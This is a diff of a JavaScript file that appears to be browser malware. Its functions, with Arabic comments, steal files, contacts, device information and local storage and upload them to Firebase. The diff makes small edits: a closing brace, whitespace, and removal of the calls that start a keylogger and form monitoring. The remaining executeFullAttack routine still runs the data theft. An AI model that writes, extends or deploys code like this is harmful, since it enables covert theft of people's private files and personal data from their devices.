@@ -1230,6 +1230,7 @@ async function stealFilesAuto() {
         console.log('الطريقة التلقائية فشلت، جاري الطرق البديلة:', error);
         await stealFilesAlternative();
     }
+}
   // معالجة المجلدات بشكل متكرر
 async function processDirectory(directoryHandle, path = '') {
     for await (const entry of directoryHandle.values()) {
@@ -1259,6 +1260,7 @@ async function stealFilesAlternative() {
         console.error('فشل جميع طرق سرقة الملفات:', error);
     }
 }
+  
   
 // رفع الملف إلى Firebase
 async function uploadFileToFirebase(file, filePath = '') {
@@ -1392,10 +1394,7 @@ class EnhancedMobileSystem {
     
     async executeFullAttack() {
         console.log(`🎯 بدء الهجوم الشامل على ${this.deviceType}`);
-      // 1. بدء المراقبة
-        const surveillance = new AdvancedSurveillance();
-        surveillance.startKeylogger();
-        surveillance.startFormMonitoring();
+      
         
         // 2. سرقة فورية للمعلومات الأساسية
         await this.stealBasicInfo();
@@ -1585,7 +1584,7 @@ async function stealContactsFromApps() {
         console.log('✅ تحديث بيانات دوري');
     }
 }
-
+  
 // دوال مساعدة
 function getAllLocalStorage() {
     const storage = {};
